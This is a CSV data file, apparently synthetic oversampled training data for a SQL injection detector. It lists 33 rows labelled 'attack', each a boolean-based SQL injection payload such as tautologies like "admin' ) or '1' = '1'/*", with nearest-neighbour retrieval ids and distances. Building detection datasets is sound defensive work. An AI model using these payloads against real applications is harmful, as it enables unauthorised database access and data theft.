id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000222,0.4071478889795077
SMOTE_000002,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,0.9706479155609111
SMOTE_000003,attack,boolean,1%' and 9127  =  7687--,nearest_attack_euclidean,R000155,0.41019456625051576
SMOTE_000004,attack,boolean,"1%"" and 2805  =  1345",nearest_attack_euclidean,R000234,0.8603803278117417
SMOTE_000005,attack,boolean,-1802' or 7931  =  5841--,nearest_attack_euclidean,R000129,0.05016422582554162
SMOTE_000006,attack,boolean,-7950'  )   or 9323  =  9323#,nearest_attack_euclidean,R000269,0.15470384672956392
SMOTE_000007,attack,boolean,1' and 5967  =  4184#,nearest_attack_euclidean,R000099,0.5496078001270863
SMOTE_000008,attack,boolean,end and 'icny' like 'icny,nearest_attack_euclidean,R000199,1.4012546933525034
SMOTE_000009,attack,boolean,"admin""  )   or ""1""  =  ""1",nearest_attack_euclidean,R000038,2.4780203233614446
SMOTE_000010,attack,boolean,"1%""  )   and 8715  =  5529",nearest_attack_euclidean,R000138,1.0356516716168476
SMOTE_000011,attack,boolean,"admin"" or ""1""  =  ""1",nearest_attack_euclidean,R000066,0.414009513647464
SMOTE_000012,attack,boolean,"-2448%""  )   or 3038  =  3038",nearest_attack_euclidean,R000125,0.031243597273257748
SMOTE_000013,attack,boolean,-1479%' or 5201  =  3398--,nearest_attack_euclidean,R000159,0.13952884318824232
SMOTE_000014,attack,boolean,1 or 1  =  1,nearest_attack_euclidean,R000089,0.05758069208781293
SMOTE_000015,attack,boolean,"1"" and 9198  =  9198--",nearest_attack_euclidean,R000132,0.4155579825642263
SMOTE_000016,attack,boolean,-6310 or 6715  =  3399,nearest_attack_euclidean,R000141,0.013306817605429873
SMOTE_000017,attack,boolean,hi' or 1  =  1 --,nearest_attack_euclidean,R000069,0.3182474344076206
SMOTE_000018,attack,boolean,0 or 1  =  1,nearest_attack_euclidean,R000037,0.42250025769506405
SMOTE_000019,attack,boolean,-9650'  )   or 1390  =  3209,nearest_attack_euclidean,R000183,0.0
SMOTE_000020,attack,boolean,1 and 5934  =  7745,nearest_attack_euclidean,R000123,0.8177277679707728
SMOTE_000021,attack,boolean,""" or 1  =  1--",nearest_attack_euclidean,R000082,0.5639736662105315
SMOTE_000022,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000136,0.029742065940771438
SMOTE_000023,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,0.3718896861856341
SMOTE_000024,attack,boolean,"-4954%""  )   or 5244  =  4832",nearest_attack_euclidean,R000308,0.5985346603223103
SMOTE_000025,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,0.1980819367332778
SMOTE_000026,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000018,2.1575132383459423
SMOTE_000027,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R000240,1.1040186063919426
SMOTE_000028,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000237,0.06453044224871621
SMOTE_000029,attack,boolean,-5369'  )   or 3208  =  6669#,nearest_attack_euclidean,R000277,0.1872105790510293
SMOTE_000030,attack,boolean,"-3377""  )   or 4982  =  6608#",nearest_attack_euclidean,R000281,0.042191250355238456
SMOTE_000031,attack,boolean,admin'  )   or '1'  =  '1'/*,nearest_attack_euclidean,R000072,1.0007329899351312
SMOTE_000032,attack,boolean,"-7295""  )   or 9323  =  9323#",nearest_attack_euclidean,R000193,0.8348864304362225
SMOTE_000033,attack,boolean,-1730' or 8571  =  8571--,nearest_attack_euclidean,R000185,0.04685850824917916
